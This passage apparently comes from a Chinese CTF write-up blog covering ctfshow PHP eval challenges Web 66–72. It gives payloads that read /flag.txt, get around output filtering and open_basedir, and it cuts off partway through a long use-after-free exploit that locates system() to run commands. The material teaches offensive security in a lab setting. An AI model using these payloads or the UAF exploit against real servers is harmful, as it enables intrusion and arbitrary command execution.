@Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 22:02:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>// 你们在炫技吗？<br>if(isset($_POST[&#x27;c&#x27;]))&#123;<br>        $c= $_POST[&#x27;c&#x27;];<br>        eval($c);<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>这次前面的 payload 都不行了，列出 <code>/</code> 目录下的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">c=print_r(scandir(&quot;/&quot;));<br>&gt;&gt;Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; .dockerenv [3] =&gt; bin [4] =&gt; dev [5] =&gt; etc [6] =&gt; flag.txt [7] =&gt; home [8] =&gt; lib [9] =&gt; media [10] =&gt; mnt [11] =&gt; opt [12] =&gt; proc [13] =&gt; root [14] =&gt; run [15] =&gt; sbin [16] =&gt; srv [17] =&gt; sys [18] =&gt; tmp [19] =&gt; usr [20] =&gt; var )<br></code></pre></td></tr></table></figure><p>读取 flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">c=highlight_file(&#x27;/flag.txt&#x27;);<br></code></pre></td></tr></table></figure><h1 id="Web-67"><a href="#Web-67" class="headerlink" title="Web 67"></a>Web 67</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 22:02:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>// 你们在炫技吗？<br>if(isset($_POST[&#x27;c&#x27;]))&#123;<br>        $c= $_POST[&#x27;c&#x27;];<br>        eval($c);<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>print_r()</code> 函数被禁了，<code>var_dump()</code> 和 <code>var_export()</code> 都能用</p><p>还是能用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">c=highlight_file(&#x27;/flag.txt&#x27;);<br></code></pre></td></tr></table></figure><h1 id="Web-68"><a href="#Web-68" class="headerlink" title="Web 68"></a>Web 68</h1><p>没有源码，只能用 <code>var_dump()</code> 函数打印，然后用 <code>include()</code> 函数读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">c=include(&#x27;/flag.txt&#x27;);<br></code></pre></td></tr></table></figure><h1 id="Web-69"><a href="#Web-69" class="headerlink" title="Web 69"></a>Web 69</h1><p><code>var_dump()</code> 不行，换成 <code>var_export()</code> 可以，然后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">c=include(&#x27;/flag.txt&#x27;);<br></code></pre></td></tr></table></figure><h1 id="Web-70"><a href="#Web-70" class="headerlink" title="Web 70"></a>Web 70</h1><p>还是只能 <code>var_export()</code> ，然后 payload 同上</p><h1 id="Web-71"><a href="#Web-71" class="headerlink" title="Web 71"></a>Web 71</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 22:02:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>ini_set(&#x27;display_errors&#x27;, 0);<br>// 你们在炫技吗？<br>if(isset($_POST[&#x27;c&#x27;]))&#123;<br>        $c= $_POST[&#x27;c&#x27;];<br>        eval($c);<br>        $s = ob_get_contents();<br>        ob_end_clean();<br>        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br><br>?&gt;<br><br>你要上天吗？<br></code></pre></td></tr></table></figure><p>源码中的 <code>ob_get_contents()</code> 函数，会返回输出缓冲区的内容，<code>ob_end_clean</code> 清空缓冲区的内容并关闭</p><p>那么整个流程就是获取缓冲区的数据然后清空，再把所有的内容都替换成 <code>?</code> ，那么我们的思路就是在替换之前把内容劫持了</p><p>利用 <code>die()</code> 函数和 <code>exit()</code> 函数都能提前终止</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">c=var_export(scandir(&quot;/&quot;));die();<br>c=include(&#x27;/flag.txt&#x27;);die();<br></code></pre></td></tr></table></figure><h1 id="Web72"><a href="#Web72" class="headerlink" title="Web72*"></a>Web72*</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 22:02:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>ini_set(&#x27;display_errors&#x27;, 0);<br>// 你们在炫技吗？<br>if(isset($_POST[&#x27;c&#x27;]))&#123;<br>        $c= $_POST[&#x27;c&#x27;];<br>        eval($c);<br>        $s = ob_get_contents();<br>        ob_end_clean();<br>        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br><br>?&gt;<br><br>你要上天吗？<br></code></pre></td></tr></table></figure><p>列出目录文件时回显没有权限</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vhdl"><span class="hljs-literal">Warning</span>: error_reporting() has been disabled <span class="hljs-keyword">for</span> security reasons <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">14</span><br><br><span class="hljs-literal">Warning</span>: ini_set() has been disabled <span class="hljs-keyword">for</span> security reasons <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">15</span><br><br><span class="hljs-literal">Warning</span>: scandir(): open_basedir restriction <span class="hljs-keyword">in</span> effect. <span class="hljs-keyword">File</span>(/) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> within the allowed path(s): (/var/www/html/) <span class="hljs-keyword">in</span> /var/www/html/index.php(<span class="hljs-number">19</span>) : eval()<span class="hljs-symbol">&#x27;d</span> code <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">1</span><br><br><span class="hljs-literal">Warning</span>: scandir(/): failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">open</span> dir: Operation <span class="hljs-keyword">not</span> permitted <span class="hljs-keyword">in</span> /var/www/html/index.php(<span class="hljs-number">19</span>) : eval()<span class="hljs-symbol">&#x27;d</span> code <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">1</span><br><br><span class="hljs-literal">Warning</span>: scandir(): (errno <span class="hljs-number">1</span>): Operation <span class="hljs-keyword">not</span> permitted <span class="hljs-keyword">in</span> /var/www/html/index.php(<span class="hljs-number">19</span>) : eval()<span class="hljs-symbol">&#x27;d</span> code <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">1</span><br><span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p><code>open_basedir</code> ：<a href="https://www.v0n.top/2020/07/10/open_basedir%e7%bb%95%e8%bf%87/">open_basedir绕过</a></p><p>使用 <code>glob://</code> 伪协议绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">c=var_export(scandir(&#x27;glob://*&#x27;));exit();#列出 open_basedir 允许的目录<br>c=var_export(scandir(&#x27;glob:///*&#x27;));die();#列出根目录<br></code></pre></td></tr></table></figure><p>还是不能读取文件，看了很多大佬的 WP</p><p>利用 uaf 绕过 <code>open_basedir</code> 执行命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ctfshow</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>, <span class="hljs-variable">$backtrace</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vuln</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$backtrace</span>; <br>            <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>            <span class="hljs-variable">$backtrace</span> = (<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>)-&gt;<span class="hljs-title function_ invoke__">getTrace</span>();<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>])) &#123;<br>                <span class="hljs-variable">$backtrace</span> = <span class="hljs-title function_ invoke__">debug_backtrace</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>, <span class="hljs-variable">$d</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x68</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$helper</span>-&gt;a);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>        <span class="hljs-variable">$e_type</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-variable">$e_phoff</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span>  = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123; <br><br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123; <br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger_uaf</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span></span>) </span>&#123;<br><br>        <span class="hljs-variable">$arg</span> = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span 